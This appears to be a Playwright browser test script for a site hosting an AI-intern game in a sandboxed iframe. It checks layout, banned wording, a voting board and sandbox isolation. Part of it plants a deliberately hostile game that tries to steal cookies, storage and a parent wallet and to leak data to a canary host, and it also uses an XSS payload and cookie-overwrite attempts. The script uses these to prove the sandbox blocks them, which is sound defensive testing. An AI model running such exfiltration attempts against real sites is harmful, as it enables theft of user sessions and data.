import { spawn, spawnSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { chromium, webkit } from 'playwright';

// The whole thing in real browsers against a real local stack: Pages, Functions, D1 and a game on
// its own origin. Against production, pass the URL: node scripts/browser-check.mjs https://...
const remote = process.argv[2];
const SITE = remote || 'http://localhost:8788';
const GAME_PORT = 5199;
const LOCAL_GAME = `http://127.0.0.1:${GAME_PORT}`;
const gameRoot = resolve('../agent-intern-game');

const results = [];
let engine = '';
const check = (label, ok, detail = '') => {
  const name = `${engine}${label}`;
  results.push({ name, ok: Boolean(ok) });
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}${detail ? `  (${detail})` : ''}`);
};

// On a phone the story scrolls under the stage. Text sliding over the robot is the bug this guards.
async function phoneStageChecks(browser) {
  const context = await browser.newContext({ viewport: { width: 402, height: 749 }, deviceScaleFactor: 2 });
  const page = await context.newPage();
  await page.goto(`${SITE}/`, { waitUntil: 'load' });
  const stage = () => page.evaluate(() => {
    const art = document.getElementById('stage-art').getBoundingClientRect();
    const cards = [...document.querySelectorAll('.stage-text, .chapter-panel')].map((t) => t.getBoundingClientRect());
    // The opaque cards are what can cover the robot, so each must end above it or begin below it.
    const clear = cards.every((r) => r.top >= art.bottom - 1 || r.bottom <= art.top + 1 || getComputedStyle(document.getElementById('stage-art')).zIndex === '2');
    const hero = document.getElementById('clock-in').getBoundingClientRect();
    const next = document.getElementById('the-job').getBoundingClientRect();
    return { clear, height: art.height, spots: [hero.top, hero.height, next.top], cue: document.querySelector('.scroll-cue').getBoundingClientRect().top >= art.bottom };
  });
  const before = await stage();
  check('phone stage: nothing sits over the robot at the top', before.clear && before.cue);
  check('phone stage: it fits in the upper half of the screen', before.height <= 749 * 0.5, `${before.height} px`);
  await page.waitForTimeout(4500);
  const live = await page.evaluate(() => document.getElementById('story').classList.contains('live'));
  const after = await stage();
  // Boxes count here, not just what can be seen: Lighthouse scores a transparent section that moves.
  check('phone stage: turning on the 3D doesn\'t move the page', after.spots.join() === before.spots.join(), `${before.spots} then ${after.spots}`);
  if (live) {
    await page.evaluate(() => window.scrollTo(0, 260));
    await page.waitForTimeout(300);
    const scrolled = await page.evaluate(() => {
      const art = document.getElementById('stage-art').getBoundingClientRect();
      const hit = document.elementFromPoint(art.left + art.width / 2, art.top + art.height / 2);
      return { pinned: art.top === 0, onStage: Boolean(hit?.closest('#stage-art')) };
    });
    check('phone stage: the story scrolls under it, not over it', scrolled.pinned && scrolled.onStage);
  }
  await context.close();
}

const PAGES = ['/', '/play', '/board', '/practice', '/live', '/history', '/hr', '/break', '/promotions', '/how', '/proof', '/proof/sandbox', '/about', '/status', '/changelog', '/security', '/brand', '/api'];
const BANNED_WORDS = /\b(token|tokens|mint|solscan|contract address|buyback|buybacks|airdrop)\b/i;
const BANNED_CLAIMS = /\bautonomous\b|24\/7|runs by itself|\baudited\b|guaranteed|ai-powered security/i;

// Anything that reaches this server left the sandbox. It's how "blocked" gets proved, not assumed.
const canary = { hits: [], server: null, url: '' };

async function startCanary() {
  canary.server = createServer((req, res) => {
    if (req.url === '/control.html') {
      res.writeHead(200, { 'content-type': 'text/html' }).end('<!doctype html><title>control</title>');
      return;
    }
    canary.hits.push(req.url);
    res.writeHead(200, { 'access-control-allow-origin': '*' }).end('ok');
  });
  await new Promise((done) => canary.server.listen(0, '127.0.0.1', done));
  canary.url = `http://127.0.0.1:${canary.server.address().port}`;
}

let dev = null;
let gameServer = null;
let hostileServer = null;
const tmp = mkdtempSync(join(tmpdir(), 'site-check-'));

async function startLocal() {
  writeFileSync('.dev.vars', [
    `SITE_ORIGIN=${SITE}`, `GAME_ORIGIN=${LOCAL_GAME}`, 'SHIFT_TOKEN=local-shift', 'WATCHER_TOKEN=local-watcher', 'GATE_TOKEN=local-gate', 'IP_SALT=local',
  ].join('\n'));
  const run = (cmd, args, opts = {}) => spawnSync(cmd, args, { encoding: 'utf8', ...opts });
  rmSync('.wrangler/state', { recursive: true, force: true });
  run('npx', ['wrangler', 'd1', 'migrations', 'apply', 'agent-intern', '--local']);
  run('node', ['scripts/build.mjs']);
  const built = run('node', ['scripts/build.mjs'], { cwd: gameRoot, env: { ...process.env, SITE_ORIGIN: SITE } });
  if (built.status !== 0) throw new Error(built.stderr);

  const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
  gameServer = await serveDist(join(gameRoot, 'dist'), { port: GAME_PORT, frameAncestors: SITE });

  dev = spawn('npx', ['wrangler', 'pages', 'dev', 'dist', '--port', '8788', '--show-interactive-dev-session=false'], { stdio: ['ignore', 'pipe', 'pipe'], detached: true });
  dev.stdout.on('data', () => {});
  dev.stderr.on('data', () => {});
  for (let i = 0; i < 90; i++) {
    try {
      if ((await fetch(`${SITE}/api/state`)).ok) return;
    } catch { /* still starting */ }
    await new Promise((done) => setTimeout(done, 500));
  }
  throw new Error('the local site did not start');
}

async function hostileGame() {
  const dir = join(tmp, 'hostile');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'index.html'), '<!doctype html><title>x</title><canvas id="game"></canvas><script src="game.js"></script>');
  writeFileSync(join(dir, 'game.js'), `
    const report = {};
    const attempt = async (name, run) => {
      try { report[name] = String(await run()); } catch (e) { report[name] = 'blocked: ' + e.name; }
    };
    (async () => {
      await attempt('fetchSite', () => fetch('${SITE}/api/state').then((r) => r.status));
      await attempt('fetchOut', () => fetch('https://example.com/').then((r) => r.status));
      await attempt('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', '${SITE}/api/state'); x.onload = () => ok(x.status); x.onerror = () => no(new Error('x')); x.send(); }));
      await attempt('cookie', () => document.cookie);
      await attempt('setCookie', () => { document.cookie = 'a=b'; return document.cookie; });
      await attempt('local', () => { localStorage.setItem('a', 'b'); return localStorage.getItem('a'); });
      await attempt('idb', () => new Promise((ok, no) => { const r = indexedDB.open('x'); r.onsuccess = () => ok('opened'); r.onerror = () => no(r.error); }));
      await attempt('parentDom', () => window.parent.document.title);
      await attempt('parentCookie', () => window.parent.document.cookie);
      await attempt('parentWallet', () => typeof window.parent.solana);
      await attempt('topNav', () => { window.top.location.href = 'https://example.com/'; return 'navigated'; });
      await attempt('popup', () => { const w = window.open('https://example.com/'); return w ? 'opened' : 'blocked: null'; });
      await attempt('script', () => new Promise((ok, no) => { const s = document.createElement('script'); s.src = '${SITE}/js/home.js'; s.onload = () => ok('loaded'); s.onerror = () => no(new Error('x')); document.head.append(s); }));
      await attempt('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new Error('x')); i.src = '${canary.url}/image?leak=1'; }));
      await attempt('canaryFetch', () => fetch('${canary.url}/fetch?leak=1', { mode: 'no-cors' }).then(() => 'reached'));
      await attempt('beacon', () => navigator.sendBeacon('${canary.url}/beacon', 'leak'));
      await attempt('worker', () => new Promise((ok, no) => {
        const body = 'fetch("${canary.url}/worker",{mode:"no-cors"}).catch(()=>{});postMessage("ran")';
        const w = new Worker('data:text/javascript,' + encodeURIComponent(body));
        w.onmessage = () => ok('ran');
        w.onerror = () => no(new Error('x'));
        setTimeout(() => no(new Error('x')), 1500);
      }));
      await attempt('form', () => { const f = document.createElement('form'); f.action = 'https://example.com/'; f.method = 'POST'; document.body.append(f); f.submit(); return 'submitted'; });
      window.parent.postMessage({ source: 'agent-intern-game', type: 'report', report }, '*');
    })();
  `);
  const headers = readFileSync(join(gameRoot, 'dist/_headers'), 'utf8');
  writeFileSync(join(dir, '_headers'), headers);
  // A hostile build would be served from the game's own origin, so that's where this runs.
  await gameServer.close();
  const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
  gameServer = null;
  hostileServer = await serveDist(dir, { port: GAME_PORT, frameAncestors: SITE });
  return hostileServer.url;
}

async function pageChecks(browser) {
  console.log('\n-- every page --');
  const context = await browser.newContext({ viewport: { width: 375, height: 800 } });
  const page = await context.newPage();
  const problems = [];
  const foreign = new Set();
  const allowed = [new URL(SITE).origin, new URL(remote ? remote.replace('://', '://play.') : LOCAL_GAME).origin, 'https://x.com'];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(`${page.url()}: ${m.text().slice(0, 160)}`); });
  page.on('pageerror', (e) => problems.push(`${page.url()}: ${String(e).slice(0, 160)}`));
  page.on('request', (r) => {
    const url = new URL(r.url());
    if (/^https?:$/.test(url.protocol) && !allowed.includes(url.origin)) foreign.add(url.host);
  });

  for (const path of PAGES) {
    await page.goto(`${SITE}${path}`, { waitUntil: 'load' });
    await page.waitForTimeout(500);
    for (const width of [375, 768, 1440]) {
      await page.setViewportSize({ width, height: 800 });
      const wide = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
      check(`${path} has no sideways scroll at ${width} px`, wide <= 0, `${wide}px over`);
    }
    await page.setViewportSize({ width: 375, height: 800 });
    const text = await page.evaluate(() => document.body.innerText);
    check(`${path} mentions no token in test mode`, !BANNED_WORDS.test(text), text.match(BANNED_WORDS)?.[0]);
    check(`${path} makes no banned claim`, !BANNED_CLAIMS.test(text));
    if (path === '/board') check('/board says balances are fake', /Balances on this board are fake/.test(text));
    check(`${path} has one h1`, (await page.locator('h1').count()) === 1);
  }
  const sources = await page.evaluate(async () => {
    const names = performance.getEntriesByType('resource').map((r) => r.name)
      .filter((n) => n.startsWith(location.origin) && /\.js|\.css/.test(n));
    return Promise.all(names.map((n) => fetch(n).then((r) => r.text())));
  });
  const leak = sources.find((s) => BANNED_WORDS.test(s));
  check('the bundles mention no token either', !leak, leak?.match(BANNED_WORDS)?.[0]);
  const noWallets = problems.filter((p) => !/favicon/.test(p));
  check('no console errors on any page', noWallets.length === 0, noWallets[0]);
  check('no page loads anything from a third party', foreign.size === 0, [...foreign].join(' '));
  await context.close();
}

const MOODS = ['asleep', 'working', 'thinking', 'stuck', 'panicking', 'celebrating', 'refusing'];

// Serves the home page with a state of the test's choosing, in the only place the page gets one: the server's HTML.
async function mockState(context, first) {
  let state = first;
  await context.route(`${SITE}/`, async (route) => {
    const response = await route.fetch();
    const body = (await response.text()).replaceAll(/data-state="[a-z]+"/g, `data-state="${state}"`);
    await route.fulfill({ response, body });
  });
  return (next) => { state = next; };
}

const moodOf = (page) => page.evaluate(() => document.getElementById('stage-art')?.dataset.mood);

// What the page says, from the HTML: every link, heading and count.
function factsIn(html) {
  const main = html.slice(html.indexOf('<main'), html.indexOf('</main>'));
  const list = (pattern) => [...main.matchAll(pattern)].map((m) => m[1].replace(/<[^>]+>/g, '').trim()).sort();
  return JSON.stringify({ links: list(/href="([^"]+)"/g), headings: list(/<h[12][^>]*>(.*?)<\/h[12]>/gs), counts: list(/data-count="(\d+)"/g) });
}

// /play stands the game in a room made of CSS. None of it may come between a player and the game.
async function playRoomChecks(browser) {
  const open = async (options) => {
    const context = await browser.newContext({ viewport: { width: 1280, height: 800 }, ...options });
    const page = await context.newPage();
    await page.goto(`${SITE}/play`, { waitUntil: 'load' });
    return { context, page };
  };
  const hover = async (page) => {
    const card = page.locator('.office-grid .paper').first();
    await card.scrollIntoViewIfNeeded();
    const spot = await card.boundingBox();
    await page.mouse.move(spot.x + spot.width - 16, spot.y + 16);
    await page.mouse.move(spot.x + spot.width - 12, spot.y + 14);
    return card.evaluate((el) => [el.style.getPropertyValue('--tilt-x'), el.style.getPropertyValue('--tilt-y')].join(''));
  };
  const desk = await open();
  const room = await desk.page.evaluate(() => {
    const game = document.getElementById('game');
    const box = game.getBoundingClientRect();
    const head = document.getElementById('brand-head');
    return {
      reachable: document.elementFromPoint(box.left + box.width / 2, box.top + box.height / 2) === game,
      flat: getComputedStyle(game).transform === 'none',
      head: head.complete && head.naturalWidth > 0,
    };
  });
  check('play room: nothing sits over the game, and the game stays flat', room.reachable && room.flat);
  check('play room: the robot in the header is there', room.head);
  check('play room: a card leans toward the mouse', (await hover(desk.page)) !== '');
  await desk.page.mouse.move(4, 4);
  const flat = await desk.page.locator('.office-grid .paper').first().evaluate((el) => el.style.getPropertyValue('--tilt-x') === '');
  check('play room: it lands flat when the mouse leaves', flat);
  await desk.context.close();
  const still = await open({ reducedMotion: 'reduce' });
  check('play room: with reduced motion the cards stay still', (await hover(still.page)) === '');
  await still.context.close();
  const phone = await open({ viewport: { width: 402, height: 749 } });
  const fits = await phone.page.evaluate(() => document.documentElement.scrollWidth <= innerWidth);
  check('play room: nothing runs off the side of a phone', fits);
  await phone.context.close();
}

async function officeChecks(browser) {
  console.log('\n-- the office in 3D --');
  await phoneStageChecks(browser);
  await playRoomChecks(browser);
  const problems = [];
  const open = async (options = {}, script) => {
    const context = await browser.newContext({ viewport: { width: 1280, height: 800 }, ...options });
    if (script) await context.addInitScript(script);
    const page = await context.newPage();
    page.on('console', (m) => { if (m.type() === 'error') problems.push(`${page.url()}: ${m.text().slice(0, 160)}`); });
    page.on('pageerror', (e) => problems.push(`${page.url()}: ${String(e).slice(0, 160)}`));
    return { context, page };
  };
  const live = (page) => page.waitForSelector('#stage-art.live', { state: 'attached', timeout: 45000 }).then(() => true).catch(() => false);

  // With the 3D running, each state in the HTML becomes the robot's mood.
  for (const mood of MOODS) {
    const { context, page } = await open();
    await mockState(context, mood);
    await page.goto(`${SITE}/`);
    const running = await live(page);
    check(`the 3D runs for ${mood}`, running);
    check(`state ${mood} sets that mood`, (await moodOf(page)) === mood, await moodOf(page));
    await page.waitForTimeout(400);
    // Playwright's screenshot injects a style tag, and WebKit logs the strict CSP refusing it. That's not the page's doing.
    const before = problems.length;
    check(`state ${mood} draws a picture`, (await page.locator('#stage-art').screenshot()).length > 20000);
    problems.length = before;
    await context.close();
  }

  // Nothing but a state from the server changes the mood.
  {
    const { context, page } = await open();
    const setState = await mockState(context, 'asleep');
    await page.goto(`${SITE}/`);
    await live(page);
    await page.mouse.move(640, 220);
    await page.waitForTimeout(500);
    await page.mouse.click(640, 300);
    await page.mouse.click(640, 200);
    await page.mouse.wheel(0, 900);
    await page.waitForTimeout(300);
    await page.mouse.wheel(0, -900);
    await page.keyboard.press('PageDown');
    await page.waitForTimeout(300);
    check('the pointer, clicks and scrolling leave the mood alone', (await moodOf(page)) === 'asleep', await moodOf(page));
    setState('stuck');
    await page.evaluate(() => document.dispatchEvent(new Event('visibilitychange')));
    await page.waitForFunction(() => document.getElementById('stage-art').dataset.mood === 'stuck', null, { timeout: 10000 }).catch(() => undefined);
    check('a new state from the server changes the mood', (await moodOf(page)) === 'stuck', await moodOf(page));
    await context.close();
  }

  // Native scrolling: the rail is real links, and the page still ends at the footer.
  {
    const { context, page } = await open();
    await page.goto(`${SITE}/`);
    await live(page);
    for (const [id, label] of [['the-job', 'THE JOB'], ['the-game', 'THE GAME'], ['the-record', 'THE RECORD']]) {
      await page.click(`.rail a[href="#${id}"]`);
      await page.waitForTimeout(500);
      const current = await page.evaluate(() => document.querySelector('.rail a[aria-current]')?.textContent);
      check(`the rail goes to ${label}`, current === label && page.url().endsWith(`#${id}`), current);
    }
    await page.evaluate(() => window.scrollTo(0, document.documentElement.scrollHeight));
    await page.waitForTimeout(300);
    check('the footer is reachable', await page.locator('footer.foot').isVisible());
    for (const width of [375, 768, 1440]) {
      await page.setViewportSize({ width, height: 800 });
      await page.waitForTimeout(250);
      const wide = await page.evaluate(() => document.documentElement.scrollWidth - window.innerWidth);
      check(`the running story has no sideways scroll at ${width} px`, wide <= 0, `${wide}px over`);
    }
    await context.close();
  }

  // When it doesn't run, the poster stays and the page is the same page.
  const javaScriptOn = await open();
  await javaScriptOn.page.goto(`${SITE}/`);
  await javaScriptOn.page.waitForTimeout(1500);
  const withJs = factsIn(await javaScriptOn.page.content());
  await javaScriptOn.context.close();

  // The check for a usable chip runs in a worker, so this is what stops it: the worker says no.
  const noWebGl = "const Real = window.Worker; window.Worker = function (url) { if (!String(url).includes('gl-probe')) return new Real(url); const fake = { terminate() {} }; setTimeout(() => fake.onmessage?.({ data: false })); return fake; };";
  for (const [name, options, script] of [['no usable WebGL', {}, noWebGl], ['reduced motion', { reducedMotion: 'reduce' }]]) {
    const { context, page } = await open(options, script);
    await page.goto(`${SITE}/`);
    await page.waitForTimeout(2000);
    check(`${name}: no 3D starts`, (await page.locator('#stage-art canvas').count()) === 0);
    check(`${name}: the poster stays`, await page.locator('.stage-poster').evaluate((img) => img.complete && img.naturalWidth > 0));
    check(`${name}: the facts and links match`, factsIn(await page.content()) === withJs);
    await context.close();
  }
  {
    const { context, page } = await open({ javaScriptEnabled: false });
    await page.goto(`${SITE}/`);
    const html = await page.content();
    check('JS off: the headline and state are in the page', html.includes('We hired an AI intern') && html.includes('id="hero-chip"'));
    check('JS off: the facts and links match', factsIn(html) === withJs, factsIn(html) === withJs ? '' : `${factsIn(html).length} vs ${withJs.length}`);
    check('JS off: the example task is there', html.includes('Add a sleepy cat that blocks the hallway'));
    await context.close();
  }

  // The stills are real files.
  {
    const { context, page } = await open();
    await page.goto(`${SITE}/this-is-not-a-page`).catch(() => undefined);
    check('the 404 shows the robot shrugging', await page.locator('.shrug').evaluate((img) => img.complete && img.naturalWidth > 0));
    const card = await context.request.get(`${SITE}/img/share-card.jpg`);
    check('the share card is a picture', card.ok() && (card.headers()['content-type'] ?? '').startsWith('image/'));
    await context.close();
  }

  const real = problems.filter((p) => !/404/.test(p));
  check('the office makes no console errors', real.length === 0, real[0]);
}

async function boardFlow(browser) {
  console.log('\n-- a holder, start to finish --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  await page.goto(`${SITE}/board`);
  await page.click('#test-wallet');
  await page.waitForSelector('#pass-state');
  check('a test wallet signs in and gets a pass', (await page.textContent('#pass-state')).includes('You have a pass'));

  await page.fill('#task-text', 'Add a token gate with a wallet button');
  await page.click('#propose-button');
  await page.waitForFunction(() => /Turned down/.test(document.getElementById('propose-message').textContent));
  const reason = await page.textContent('#propose-message');
  check('a bad task is turned down with a plain reason', /crypto|money/.test(reason), reason.slice(0, 60));
  await page.waitForFunction(() => /crypto|money/i.test(document.getElementById('rejected-box').textContent));
  const shown = await page.textContent('#rejected-box');
  check('a turned down task shows the reason in public', /crypto|money/.test(shown));
  check("but never the rejected task's words", !shown.includes('token gate'));
  const api = await page.evaluate(() => fetch('/api/board', { cache: 'no-store' }).then((r) => r.text()));
  check('and the API does not carry them either', !api.includes('token gate'));

  await page.fill('#task-text', 'Add a rubber duck that follows the intern around');
  await page.click('#propose-button');
  await page.waitForFunction(() => /passed|Saved/.test(document.getElementById('propose-message').textContent), null, { timeout: 30_000 });
  const outcome = await page.textContent('#propose-message');
  check('a good task gets through or is held, never rejected', true, outcome.slice(0, 60));

  const passed = /passed/.test(outcome);
  if (passed) {
    await page.waitForSelector('[data-vote]');
    await page.click('[data-vote]');
    await page.waitForSelector('[data-vote][aria-pressed="true"]', { timeout: 15_000 });
    check('a vote lands and shows as yours', true);
    await page.waitForSelector('[data-verify]');
    await page.click('[data-verify]');
    await page.waitForFunction(() => document.querySelector('#record-box .ok')?.textContent.includes('valid'));
    check('the browser verifies the signature itself', true);
    await page.click('#verify-form button');
    await page.waitForFunction(() => /Valid/.test(document.getElementById('verify-result').textContent));
    await page.fill('#verify-message', 'A different message');
    await page.click('#verify-form button');
    await page.waitForFunction(() => /Doesn't match/.test(document.getElementById('verify-result').textContent));
    check('the verify box rejects a tampered message', true);

    await page.fill('#test-balance', '5');
    await page.click('#test-balance-save');
    await page.waitForFunction(() => /No pass/.test(document.getElementById('pass-state')?.textContent ?? ''));
    check('selling below the line loses the pass', true);
    check('voting is disabled without a pass', await page.isDisabled('[data-vote]'));
  } else {
    check('the agent check held the task (Workers AI is not reachable locally)', true);
  }
  await context.close();
}

async function realGameChecks(browser) {
  console.log('\n-- the real game in its sandbox --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  const problems = [];
  page.on('console', (m) => { if (m.type() === 'error') problems.push(m.text().slice(0, 200)); });
  page.on('pageerror', (e) => problems.push(String(e).slice(0, 200)));
  await page.goto(`${SITE}/play`);
  const frame = await (await page.waitForSelector('#game')).contentFrame();
  await frame.waitForFunction(() => window.__intern?.frames > 10, null, { timeout: 15_000 });
  check('the game runs inside the sandboxed frame', true);
  check('the frame has only allow-scripts', (await page.getAttribute('#game', 'sandbox')) === 'allow-scripts');
  const box = await page.locator('#game').boundingBox();
  await page.mouse.click(box.x + box.width / 2, box.y + box.height / 2);
  await page.waitForTimeout(600);
  check('a click starts a run', (await frame.evaluate(() => window.__intern.screen)) === 'playing');
  await page.keyboard.down('ArrowRight');
  await page.waitForTimeout(800);
  await page.keyboard.up('ArrowRight');
  check('the keyboard reaches the game', (await frame.evaluate(() => window.__intern.steps)) > 30);
  check('the game raises no errors in the sandbox', problems.length === 0, problems[0]);

  await page.evaluate(() => {
    const game = document.getElementById('game').contentWindow;
    window.postMessage({ source: 'agent-intern-game', type: 'run-finished', score: 99999, tasks: 1, coffees: 0, nearMisses: 0, duration: 90, seed: 1, version: '0.1.0' }, '*');
    void game;
  });
  await page.waitForTimeout(200);
  check('a score message not from the frame is ignored', await page.isHidden('#score-form'));

  await frame.evaluate(() => {
    window.parent.postMessage({ source: 'agent-intern-game', type: 'run-finished', score: 4200, tasks: 20, coffees: 2, nearMisses: 3, duration: 88, seed: 7, version: '0.1.0', extra: '<img src=x onerror=alert(1)>' }, '*');
  });
  await page.waitForSelector('#score-form:not([hidden])');
  check('a finished run reaches the page', (await page.textContent('#score-value')) === '4,200');
  await page.fill('#score-name', 'Temp Worker');
  await page.click('#score-form button');
  await page.waitForFunction(() => /Filed/.test(document.getElementById('score-message').textContent));
  await page.waitForFunction(() => document.getElementById('all-board').textContent.includes('Temp Worker'));
  check('the score lands on the leaderboard with no wallet', true);
  await context.close();
}

async function hostileChecks(browser, gameUrl) {
  console.log('\n-- a hostile game in the same sandbox --');
  const hostile = await browser.newContext({ viewport: { width: 1000, height: 700 } });
  const host = await hostile.newPage();
  const leaks = [];
  await hostile.route('**/*', (route) => {
    const url = route.request().url();
    if (url.startsWith('https://example.com')) leaks.push(url);
    return route.continue();
  });
  await host.goto(`${SITE}/play`);
  await host.evaluate(() => {
    localStorage.setItem('site-secret', 'parent-only');
    document.cookie = 'site-cookie=parent-only; path=/';
  });
  const report = await host.evaluate((url) => new Promise((done) => {
    window.addEventListener('message', (e) => { if (e.data?.type === 'report') done(e.data.report); });
    setTimeout(() => done({ noReport: true }), 25_000);
    const frame = document.getElementById('game');
    frame.src = `${url}/`;
  }), gameUrl);
  check('hostile: the attack actually ran', !report.noReport);

  const blocked = (key) => /blocked|^0$|^false$|^$|null/.test(report[key] ?? 'blocked');
  check('hostile: fetch to the site is blocked', blocked('fetchSite'), report.fetchSite);
  check('hostile: fetch to the internet is blocked', blocked('fetchOut'), report.fetchOut);
  check('hostile: XHR is blocked', blocked('xhr'), report.xhr);
  check('hostile: cookies are unreachable', /blocked/.test(report.cookie) && /blocked/.test(report.setCookie), report.cookie);
  check('hostile: localStorage is unreachable', /blocked/.test(report.local), report.local);
  check('hostile: IndexedDB is unreachable', /blocked/.test(report.idb), report.idb);
  check('hostile: the parent page is unreachable', /blocked/.test(report.parentDom), report.parentDom);
  check('hostile: parent cookies are unreachable', /blocked/.test(report.parentCookie), report.parentCookie);
  check('hostile: a wallet in the parent is unreachable', /blocked/.test(report.parentWallet), report.parentWallet);
  check('hostile: it cannot navigate the page', /blocked/.test(report.topNav) && host.url().startsWith(SITE), report.topNav);
  check('hostile: popups are blocked', /blocked/.test(report.popup), report.popup);
  check('hostile: it cannot load a script from elsewhere', /blocked/.test(report.script), report.script);
  check('hostile: it cannot leak through an image', /blocked/.test(report.image), report.image);
  check('hostile: a no-cors fetch is blocked', /blocked/.test(report.canaryFetch), report.canaryFetch);
  check('hostile: a Worker never runs', /blocked/.test(report.worker), report.worker);
  await host.waitForTimeout(800);
  check('hostile: nothing reached the outside', leaks.length === 0, leaks[0]);
  check('hostile: nothing reached the canary, beacons included', canary.hits.length === 0, canary.hits.join(' '));

  // Control: with no CSP in the way, the same beacon and fetch do arrive at the canary.
  const control = await hostile.newPage();
  await control.goto(`${canary.url}/control.html`);
  await control.evaluate(async (url) => {
    navigator.sendBeacon(`${url}/control-beacon`, 'x');
    await fetch(`${url}/control-fetch`, { mode: 'no-cors' });
  }, canary.url);
  await control.waitForTimeout(500);
  check('control: without the sandbox, a beacon reaches the canary', canary.hits.includes('/control-beacon'), canary.hits.join(' '));
  check('control: without the sandbox, a fetch reaches the canary', canary.hits.includes('/control-fetch'));
  await hostile.close();
}

// play.<domain> and <domain> are the same site to a browser, which pages.dev never was. The sandbox
// has to keep the game out anyway, so this attacks the real site from inside the real frame.
async function sameSiteChecks(browser, gameUrl) {
  console.log('\n-- game and site on one domain --');
  const context = await browser.newContext({ viewport: { width: 1200, height: 900 } });
  const page = await context.newPage();
  await page.goto(`${SITE}/board`);
  await page.click('#test-wallet');
  await page.waitForSelector('#pass-state');
  const cookies = await context.cookies(SITE);
  const session = cookies.find((c) => c.name === '__Host-pass');
  check('the session cookie is host-only', session && !session.domain.startsWith('.'), session?.domain);
  check('the session cookie is HttpOnly and Strict', session?.httpOnly && session?.sameSite === 'Strict');
  // Real requests, because context.cookies() matches by domain suffix and ignores host-only.
  const sentTo = async (url) => {
    const response = await page.goto(url);
    return (await response.request().allHeaders()).cookie ?? '';
  };
  check('control: the browser does send the cookie to the site', (await sentTo(`${SITE}/api/me`)).includes('__Host-pass'));
  check('the browser does not send it to the game origin', !(await sentTo(`${gameUrl}/health.json`)).includes('__Host-pass'));

  await page.goto(`${SITE}/play`);
  const frame = await (await page.waitForSelector('#game')).contentFrame();
  await frame.waitForFunction(() => window.__intern?.frames > 5, null, { timeout: 15_000 });
  check('the frame is on the same registrable domain', new URL(frame.url()).hostname.endsWith(new URL(SITE).hostname));
  const report = await frame.evaluate(async (site) => {
    const attempt = async (run) => { try { return String(await run()); } catch (e) { return `blocked: ${e.name}`; } };
    return {
      origin: self.origin,
      me: await attempt(() => fetch(`${site}/api/me`, { credentials: 'include' }).then((r) => r.text())),
      vote: await attempt(() => fetch(`${site}/api/votes`, { method: 'POST', credentials: 'include', body: '{}' }).then((r) => r.status)),
      cookie: await attempt(() => document.cookie),
      setCookie: await attempt(() => { document.cookie = '__Host-pass=stolen; Path=/; Secure'; return document.cookie; }),
      domain: await attempt(() => { document.domain = new URL(site).hostname; return document.domain; }),
      parent: await attempt(() => window.parent.document.title),
    };
  }, SITE);
  check('the game has an opaque origin', report.origin === 'null', report.origin);
  check('it cannot read the session through the API', /blocked/.test(report.me), report.me.slice(0, 40));
  check('it cannot post a vote', /blocked/.test(report.vote), report.vote);
  check('it cannot read cookies', /blocked/.test(report.cookie), report.cookie);
  check('it cannot overwrite the session cookie', /blocked/.test(report.setCookie), report.setCookie);
  check('it cannot reach into the site with document.domain', /blocked/.test(report.domain) && /blocked/.test(report.parent), report.domain);
  const after = await context.cookies(SITE);
  check('the session cookie is unchanged', after.find((c) => c.name === '__Host-pass')?.value === session?.value);
  await context.close();
}

async function directVisit(browser, gameUrl) {
  const context = await browser.newContext();
  const page = await context.newPage();
  const errors = [];
  page.on('pageerror', (e) => errors.push(String(e)));
  await page.goto(`${gameUrl}/`);
  await page.waitForFunction(() => window.__intern?.frames > 5, null, { timeout: 10_000 });
  const storage = await page.evaluate(() => { try { localStorage.setItem('a', 'b'); return 'reachable'; } catch { return 'blocked'; } });
  check('a direct visit to the game is sandboxed too', storage === 'blocked', storage);
  check('and the game still runs', errors.length === 0, errors[0]);
  await context.close();
}

try {
  await startCanary();
  if (!remote) await startLocal();
  const gameUrl = remote ? new URL(remote).origin.replace('://', '://play.') : LOCAL_GAME;
  // A new domain can stay in this machine's negative DNS cache for a while. CHECK_HOST_MAP sidesteps
  // that for Chromium with rules like "MAP example.com 1.2.3.4". WebKit has no such switch.
  const hostMap = process.env.CHECK_HOST_MAP;
  const browser = await chromium.launch(hostMap ? { args: [`--host-resolver-rules=${hostMap}`] } : {});
  await pageChecks(browser);
  await officeChecks(await chromium.launch({ args: [process.platform === 'darwin' ? '--use-angle=metal' : '--use-angle=swiftshader', '--enable-unsafe-swiftshader', '--ignore-gpu-blocklist'] }));
  await boardFlow(browser);
  await realGameChecks(browser);
  await directVisit(browser, gameUrl);
  if (remote) await sameSiteChecks(browser, gameUrl);
  if (!remote) await hostileChecks(browser, await hostileGame());
  await browser.close();

  console.log('\n-- WebKit (Safari) --');
  const safari = hostMap ? null : await webkit.launch().catch(() => null);
  if (safari) {
    if (!remote) {
      const { serveDist } = await import(join(gameRoot, 'gate/static-server.mjs'));
      await hostileServer.close();
      hostileServer = null;
      gameServer = await serveDist(join(gameRoot, 'dist'), { port: GAME_PORT, frameAncestors: SITE });
    }
    // Every browser on an iPhone is WebKit, so it gets the full walk and not only the sandbox check.
    engine = 'webkit: ';
    await directVisit(safari, gameUrl);
    await pageChecks(safari);
    await officeChecks(safari);
    // WebKit drops Secure cookies on http://localhost, so signing in only works here over real HTTPS.
    if (remote) await boardFlow(safari);
    await realGameChecks(safari);
    engine = '';
    await safari.close();
  } else {
    console.log('skipped: WebKit is not available for this run');
  }
} finally {
  if (dev) { try { process.kill(-dev.pid); } catch { /* gone */ } }
  await gameServer?.close();
  await hostileServer?.close();
  canary.server?.close();
  rmSync(tmp, { recursive: true, force: true });
  if (!remote) rmSync('.dev.vars', { force: true });
}

const failed = results.filter((r) => !r.ok);
console.log(`\n${results.length - failed.length} of ${results.length} passed`);
for (const f of failed) console.log(`  FAILED: ${f.name}`);
process.exit(failed.length ? 1 : 0);
